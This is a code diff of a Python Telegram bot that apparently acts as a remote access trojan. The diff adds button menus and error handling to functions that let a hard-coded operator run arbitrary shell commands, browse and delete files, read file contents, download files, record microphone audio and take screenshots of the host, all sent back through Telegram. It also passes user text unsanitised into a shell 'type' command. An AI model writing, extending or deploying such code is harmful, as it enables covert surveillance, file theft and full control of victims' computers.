@@ -11,6 +11,27 @@ ADMIN = 804011643
 
 bot = telebot.TeleBot(API_TOKEN)
 
+cd_btn = types.KeyboardButton("cd")
+cd_path_btn = types.KeyboardButton("cd_path")
+dir_btn = types.KeyboardButton("dir")
+del_btn = types.KeyboardButton("del")
+exec_type_btn = types.KeyboardButton("type")
+exec_get_file_btn = types.KeyboardButton("get_file")
+exec_cmd_sub_btn = types.KeyboardButton("exec_cmd_sub")
+record_btn = types.KeyboardButton("record")
+screenshot_btn = types.KeyboardButton("screenshot")
+
+markup = types.ReplyKeyboardMarkup(True, True)
+markup.add(cd_btn, cd_path_btn, dir_btn, exec_type_btn, del_btn,
+            exec_cmd_sub_btn, exec_get_file_btn, record_btn, screenshot_btn)
+
+def create_markup(markup):
+    list_files = os.listdir(os.getcwd())
+    for i in list_files:
+        markup.add(i)
+        
+    markup.add("None")
+
 def record(time=6):
     filename = "recorded.wav"
 
@@ -58,15 +79,18 @@ def checkID(ms):
 def exec_cd(ms):
     if checkID(ms):
         output = os.getcwd()
-        bot.send_message(ADMIN, output)
+        bot.send_message(ADMIN, output, reply_markup=markup)
 
 def exec_cd_path(ms):
     if checkID:
-        bot.send_message(ADMIN, "Enter path...")
+        markup_cd = types.ReplyKeyboardMarkup()
+        create_markup(markup_cd)
+        markup_cd.add("..")
+        bot.send_message(ADMIN, "Enter path...", reply_markup=markup_cd)
         
         @bot.message_handler(content_types=["text"])
         def exec_cd_path_next(ms):
-            if checkID(ms):
+            if checkID(ms) and ms.text != "None":
                 try:
                     path = ms.text
                     os.chdir(path)
@@ -74,56 +98,90 @@ def exec_cd_path(ms):
                     bot.send_message(ADMIN, output)
                 except Exception as e:
                     bot.send_message(ADMIN, f"Error:\n{e}")
+                    
+            bot.send_message(ADMIN, "ㅤ", reply_markup=types.ReplyKeyboardRemove())
+            bot.send_message(ADMIN, "ㅤ", reply_markup=markup)
 
         bot.register_next_step_handler(ms, exec_cd_path_next)
 
 def exec_dir(ms):
     if checkID(ms):
-        output = subprocess.check_output("dir /b", shell=True).decode("utf-8")
-        bot.send_message(ADMIN, output)
+        try:
+            list_files = os.listdir(os.getcwd())
+            output = ""
+            for i in list_files:
+                output += f"{i}\n"
+            
+            if output:
+                bot.send_message(ADMIN, output, reply_markup=markup)
+            else:
+                bot.send_message(ADMIN, "<Empty>", reply_markup=markup)
+        except Exception as e:
+            bot.send_message(ADMIN, f"Error:\n{e}")
 
 def exec_del(ms):
     if checkID(ms):
-        bot.send_message(ADMIN, "Enter path...")
+        markup_del = types.ReplyKeyboardMarkup()
+        create_markup(markup_del)
+        bot.send_message(ADMIN, "Enter path...", reply_markup=markup_del)
 
         @bot.message_handler(content_types=["text"])
         def exec_del_next(ms):
-            if checkID(ms):
+            if checkID(ms) and ms.text != "None":
                 try:
                     path_file = ms.text
                     os.remove(path_file)
                     bot.send_message(ADMIN, "File removed!")
                 except Exception as e:
                     bot.send_message(ADMIN, f"Error:\n{e}")
+                    
+            bot.send_message(ADMIN, "ㅤ", reply_markup=types.ReplyKeyboardRemove())
+            bot.send_message(ADMIN, "ㅤ", reply_markup=markup)
 
         bot.register_next_step_handler(ms, exec_del_next)
 
 def exec_type(ms):
     if checkID(ms):
-        bot.send_message(ADMIN, "Enter path...")
+        markup_type = types.ReplyKeyboardMarkup()
+        create_markup(markup_type)
+        bot.send_message(ADMIN, "Enter path...", reply_markup=markup_type)
         
         @bot.message_handler(content_types=["text"])
         def exec_type_next(ms):
-            if checkID(ms):
-                path = ms.text
-                output = subprocess.check_output(f"type {path}", shell=True).decode("utf-8")
-                if output:
-                    bot.send_message(ADMIN, output)
-                else:
-                    bot.send_message(ADMIN, "<Empty>")
+            if checkID(ms) and ms.text != "None":
+                try:
+                    path = ms.text
+                    output = subprocess.check_output(f"type {path}", shell=True).decode("utf-8")
+                    if output:
+                        bot.send_message(ADMIN, output)
+                    else:
+                        bot.send_message(ADMIN, "<Empty>")
+                except Exception as e:
+                    bot.send_message(ADMIN, f"Error:\n{e}")
+                    
+            bot.send_message(ADMIN, "ㅤ", reply_markup=types.ReplyKeyboardRemove())
+            bot.send_message(ADMIN, "ㅤ", reply_markup=markup)
 
         bot.register_next_step_handler(ms, exec_type_next)
 
 def exec_get_file(ms):
     if checkID(ms):
-        bot.send_message(ADMIN, "Enter path...")
+        markup_file = types.ReplyKeyboardMarkup()
+        create_markup(markup_file)
+        bot.send_message(ADMIN, "Enter path...", reply_markup=markup_file)
         
         @bot.message_handler(content_types=["text"])
         def get_file_next(ms):
-            if checkID(ms):
-                path = ms.text
-                bot.send_document(ADMIN, open(path, "rb"))
-        
+            if checkID(ms) and ms.text != "None":
+                try:
+                    path = ms.text
+                    bot.send_document(ADMIN, open(path, "rb"))
+                except Exception as e:
+                    bot.send_message(ADMIN, f"Error:\n{e}")
+
+            bot.send_message(ADMIN, "ㅤ", reply_markup=types.ReplyKeyboardRemove())
+            bot.send_message(ADMIN, "ㅤ", reply_markup=markup)
+                    
         bot.register_next_step_handler(ms, get_file_next)
 
 def exec_recording(ms):
@@ -156,7 +214,7 @@ def exec_screenshot(ms):
         myScreenshot.save("screenshot.jpg")
 
         with open("screenshot.jpg", "rb") as photo:
-            bot.send_photo(ADMIN, photo)
+            bot.send_photo(ADMIN, photo, reply_markup=markup)
 
 def exec_cmd_sub(ms):
     if checkID(ms):
@@ -168,9 +226,9 @@ def exec_cmd_sub(ms):
                 cmd = ms.text
                 output = subprocess.check_output(cmd, shell=True).decode("utf-8")
                 if output:
-                    bot.send_message(ADMIN, output)
+                    bot.send_message(ADMIN, output, reply_markup=markup)
                 else:
-                    bot.send_message(ADMIN, "Empty")
+                    bot.send_message(ADMIN, "Empty", reply_markup=markup)
             except Exception as e:
                 bot.send_message(ADMIN, f"Error:\n{e}")
 
@@ -179,21 +237,7 @@ def exec_cmd_sub(ms):
 @bot.message_handler(commands=["_start", "_help"])
 def send_welcome(ms):
     if checkID(ms):
-        markup = types.ReplyKeyboardMarkup()
-
-        cd_btn = types.KeyboardButton("cd")
-        cd_path_btn = types.KeyboardButton("cd_path")
-        dir_btn = types.KeyboardButton("dir")
-        del_btn = types.KeyboardButton("del")
-        exec_type_btn = types.KeyboardButton("type")
-        exec_get_file_btn = types.KeyboardButton("get_file")
-        exec_cmd_sub_btn = types.KeyboardButton("exec_cmd_sub")
-        record_btn = types.KeyboardButton("record")
-        screenshot_btn = types.KeyboardButton("screenshot")
-        markup.add(cd_btn, cd_path_btn, dir_btn, exec_type_btn, del_btn,
-                   exec_cmd_sub_btn, exec_get_file_btn, record_btn, screenshot_btn)
-
-        bot.send_message(ADMIN, text="Yretra", reply_markup=markup)
+        bot.send_message(ADMIN, text="ㅤ", reply_markup=markup)
 
 
 @bot.message_handler(content_types=["text"])
@@ -225,5 +269,7 @@ def CheckCommand(ms):
 
         elif ms.text == "exec_cmd_sub":
             exec_cmd_sub(ms)
+
+
 
 bot.infinity_polling()
